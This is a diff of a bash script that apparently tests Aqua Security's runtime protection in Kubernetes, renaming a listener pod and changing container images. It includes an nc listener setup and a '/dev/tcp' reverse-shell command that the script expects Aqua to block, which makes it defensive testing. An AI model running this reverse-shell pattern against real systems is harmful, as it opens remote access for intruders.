@@ -329,27 +329,27 @@ test_reverse_shell() {
             if check_container_existence; then
                 # Create a Centos pod with nc listener
                 echo
-                print_colored_message yellow "Creating Centos pod"
+                print_colored_message yellow "Creating listener pod"
                 echo
-                kubectl run centos --image=stanhoe/centos-nc:7 --command sleep infinity
+                kubectl run listener --image=stanhoe/aqua-warden:latest --command sleep infinity
                 echo
-                print_colored_message yellow "Waiting for the Centos container pod to start running..."
-                while ! kubectl get pods | grep centos | grep -q "Running"; do
+                print_colored_message yellow "Waiting for the listener container pod to start running..."
+                while ! kubectl get pods | grep listener | grep -q "Running"; do
                     sleep 5
                 done
                 echo
-                print_colored_message yellow "Centos container pod is running. Configuring nc listener in Centos pod..."
+                print_colored_message yellow "Listener container pod is running. Configuring nc listener in pod..."
                 echo
-                kubectl exec centos -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
+                kubectl exec -ti listener -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
                 echo
                 print_colored_message yellow "Retrieving IP address..."
-                centos_pod_ip=$(kubectl get pods -o wide | grep centos | awk '{print $6}')
-                echo "$centos_pod_ip"
+                listener_pod_ip=$(kubectl get pods -o wide | grep listener | awk '{print $6}')
+                echo "$listener_pod_ip"
                 echo
-                print_colored_message yellow "Executing reverse shell from Aqua test container to Centos container..."
+                print_colored_message yellow "Executing reverse shell from Aqua test container to listener container..."
                 echo
                 aqua_test_container=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$centos_pod_ip/12345 <&1"
+                kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$listener_pod_ip/12345 <&1"
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
                 echo
@@ -433,7 +433,7 @@ test_block_container_exec() {
                 container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo "Executing shell session in the Aqua test application container..."
                 echo
-        kubectl exec -it $pod_name --container $container_name -- /bin/bash
+        kubectl exec -it $pod_name --container $container_name -- bash
                 echo
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
@@ -457,18 +457,18 @@ terminate_program() {
     read -p "Are you sure you want to terminate the program? (y/n): " terminate_choice
     case $terminate_choice in
         [Yy]*)
-            if check_container_existence || check_pod_status "centos"; then
+            if check_container_existence || check_pod_status "listener"; then
                 read -p "Do you want to delete the Aqua test container before termination? (y/n): " delete_container
                 if [[ $delete_container =~ ^[Yy] ]]; then
                     delete_test_container
-                    kubectl delete pod centos --force 
+                    kubectl delete pod listener --force 
                 elif [[ $delete_container =~ ^[Nn] ]]; then
                     echo "Exiting program without deleting the Aqua test container."
                 else
                     echo "Invalid input. Exiting program without deleting the Aqua test container."
                 fi
             else
-                echo "Aqua test container or Centos container is not running."
+                echo "Aqua test container or listener container is not running."
                 echo "Exiting program without deleting the Aqua test container."
             fi
             unset AQUA_WARDEN_SKIP_INSTRUCTIONS # Unset env var for skip instructions flag
@@ -499,7 +499,7 @@ deploy_test_container() {
     echo
     print_colored_message yellow "Deploying Aqua test container..."
     # Deploying the container using kubectl
-    kubectl create deployment aqua-test-container --image=stanhoe/ubuntu-wget:latest -- sleep infinity
+    kubectl create deployment aqua-test-container --image=stanhoe/aqua-warden:latest -- sleep infinity
 
     # Wait for the deployment to complete
     echo
